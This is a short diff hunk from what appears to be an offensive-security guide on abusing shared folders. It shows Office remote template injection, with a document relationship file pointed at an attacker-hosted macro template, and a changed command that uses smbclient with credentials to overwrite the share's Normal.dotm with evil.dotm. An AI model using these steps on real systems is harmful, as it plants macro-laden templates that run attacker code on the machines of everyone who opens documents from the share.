@@ -18,7 +18,7 @@ Shared folders hold the documents a team opens every day, which makes them a del
 # (document.xml.rels Target points at the attacker's macro template)
 unzip doc.docx word/_rels/settings.xml.rels   # edit Target=http(s)://attacker/t.dotm
 # Or replace a shared template that Office autoloads
-cp evil.dotm '//share/Templates/Normal.dotm'
+smbclient //<target>/share -U user%pass -c 'cd Templates; put evil.dotm Normal.dotm'
 ```
 
 ## Exploitation notes
